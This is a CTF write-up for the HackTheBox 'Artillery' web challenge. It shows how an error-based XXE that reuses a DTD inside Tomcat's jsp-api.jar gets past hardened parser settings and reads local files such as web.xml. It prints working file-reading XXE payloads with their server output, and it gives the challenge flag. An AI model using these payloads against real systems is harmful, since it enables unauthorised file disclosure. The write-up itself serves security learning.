---
title: "Cyber Apocalypse 2021 5/5 - Artillery"
date: 2021-04-28T12:00:04+01:00
draft: false
author: pistach3
tags:
  - CTF
  - Writeup
  - CyberApocalypse2021
---

**Artillery** was a web challenge of the Cyber Apocalypse 2021 CTF organized by HackTheBox. We were given the source code of the server to help us solve the challenge. This challenge was a nice opportunity to learn more about **XXE** vulnerabilities.

<!--more-->

# First steps

When you enter a query in the search bar, like '`qwerty`' and press enter, nothing happens.

The website will make a `GET` request on `/airbase/?query=qwerty`, and nothing more. Which is weird...

So, the next step is to have a look at the `airbase.js` JavaScript code:
```js
async function getResults() {
  const query = document.getElementById("query").value;
  const xml = `<?xml version="1.0" encoding="ISO-8859-1"?><root><query>${query}</query></root>`;
  const response = await fetch('/search', {
    method: 'POST',
    headers: {
      'Content-Type' : 'application/xml'
    },
    body: xml
  });

  [...]
}
```

> We have a `getResults` function which makes an `XML` `POST` query on `/search`.

Let's hit the search endpoint with a random query!

Here is the corresponding `curl` command. Our query is '`gun`':
```bash
curl 'http://<IP>:<PORT>/search' -H 'Content-Type: application/xml' -H 'Origin: http://<IP>:<PORT>' --data-raw '<?xml version="1.0" encoding="ISO-8859-1"?><root><query>gun</query></root>'
```

We have the following response:
```json
[{"name": "Gunstar", "url":"gunstar.jpg", "desc":"Capable of both short and long-range space flight, the Gunstar is a two-person craft. It is approximately 20 meters in length and carries a complement of two operators, a pilot and a gunner."}, { "name" : "", "url" : "", "desc" : "" }]
```

Now, what ? Let's have a look at the server code which was given to us!

# Server setup

We are given the server code with a `Dockerfile` to boot!

Let's setup the environment on our side:

```docker
# Build
docker build . -t web_artillery
# Run it
docker run -p 8080:8080 -name artilley web_artillery:latest
```

We can go into the container and have a look around using:
```docker
docker exec -it artillery bash
```

# Analysis

## Where will the flag be?

The file `WEB-INF/web.xml` describes the routes served by the server:

- one of them is `/search`, that we already know of;
- the other one is `/flag_hash`. Will we get the flag by hitting `/flag_hash`? No!

In the `entrypoint.sh` file given, we have the following lines of code:

```bash
hash=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1 | md5sum | cut -d ' ' -f 1)
sed -i "s/hash/$hash/g" /tomcat/webapps/ROOT/WEB-INF/web.xml
```

The `/flag_hash` route will have its `hash` part generated at the server setup, and will become a `/flag_aZ09rand0m` route.

We also know, according to the file `WEB-INF/classes/Flag.java`, that we will get the flag by making a `GET` query to that generated endpoint.

> Therefore, if we can get the content of the `WEB-INF/web.xml` file, we will get the generated `flag` route, which will give us the flag through a `GET` request.

## What vulnerability will we use?

We are sending XML to the server. What is the first thing that comes to mind? `XXE`, or [*XML external entity injection*](https://portswigger.net/web-security/xxe)!

However, we are going to have a hard time because of those lines in `WEB-INF/classes/Results.java`

```java
// Make sekure!
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setAttribute(XMLConstants.FEATURE_SECURE_PROCESSING, true);
```

This line:
```java
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

Will throw a fatal error if you use a `DOCTYPE` declaration in your XML.

And this one:
```java
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

Will not let you load `external DTDs`.

# XXE

## Focusing on `local DTD` files

Having tried some XXE payloads without success, I had another look at the given `Dockerfile`:

```docker
RUN find / -name "*.dtd" -type f -delete
```

The above line, which removes all `.dtd` files from the system, meant I was going to have a hard look at **`local DTD` XXE**.

By looking at the options using `local DTD` files in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-with-local-dtd), I tried the first payload:

```dtd
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">

    %local_dtd;
]>
<root></root>
```

And we actually get an answer!
```
java.io.FileNotFoundException: /abcxyz (No such file or directory)
	at java.io.FileInputStream.open0(Native Method)
	at java.io.FileInputStream.open(FileInputStream.java:195)
	at java.io.FileInputStream.<init>(FileInputStream.java:138)
	at java.io.FileInputStream.<init>(FileInputStream.java:93)
```

If we try with `/etc/passwd`, we have a different answer:

```
org.xml.sax.SAXParseException; systemId: file:///etc/passwd; lineNumber: 1; columnNumber: 1; The markup declarations contained or pointed to by the document type declaration must be well-formed.
```

Which means that this file exists!

##  We have a `tomcat` server

`PayloadsAllTheThings` links to a [page](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md) with even more XXE payloads with DTD files involved.

Remember, **all dtd files in the system were removed in the Dockerfile**...

But what about `.jar` files containing dtd files?

If we `docker exec -it artillery bash`, we can even look for them, they are in `/tomcat/lib`.

For example the file `/tomcat/lib/jsp-api.jar` exists. We can adapt one XXE payload given [here](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md):

```dtd
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">

    <!ENTITY % URI '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

To our target system:
```dtd
<!DOCTYPE message [
    <!--
    Our jsp-api.jar is located in /tomcat/lib.
    I did not find the /javax path in jsp-api.jar
    But thankfully, the jspxml.dtd was in the /jakarta path
    -->
    <!ENTITY % local_dtd SYSTEM "jar:file:/tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd">

    <!-- By targeting the WEB-INF/web.xml file, we will have the generated flag route
    In the returned Java error returned by the server.
    -->
    <!ENTITY % URI '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:////tomcat/webapps/ROOT/WEB-INF/web.xml">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

And, it works! We have the following error message response:
```xml
java.io.FileNotFoundException: /abcxyz/<web-app version="3.0"
  xmlns="http:/java.sun.com/xml/ns/javaee"
  xmlns:xsi="http:/www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http:/java.sun.com/xml/ns/javaee http:/java.sun.com/xml/ns/javaee/web-app_3_0.xsd">

   <servlet>
      <servlet-name>Results</servlet-name>
      <servlet-class>Results</servlet-class>
   </servlet>

   <servlet-mapping>
      <servlet-name>Results</servlet-name>
      <url-pattern>/search</url-pattern>
   </servlet-mapping>

   <servlet>
      <servlet-name>Flag</servlet-name>
      <servlet-class>Flag</servlet-class>
   </servlet>

   <servlet-mapping>
      <servlet-name>Flag</servlet-name>
      <url-pattern>/flag_9535b9714ef44eb8928bbe8b70e04198</url-pattern>
   </servlet-mapping>

</web-app> (No such file or directory)
...
```

We get the flag route: `/flag_9535b9714ef44eb8928bbe8b70e04198`.

Now, we can redo the same steps on the live server. By making a `GET` request to the flag route given in the error response, we get the real flag `CHTB{OOB_p1us_err0r_b@s3d_XXE_da_b0ss!}`

# Closing words

It was a nice XXE challenge which made me learn about XXE with local DTD files :)
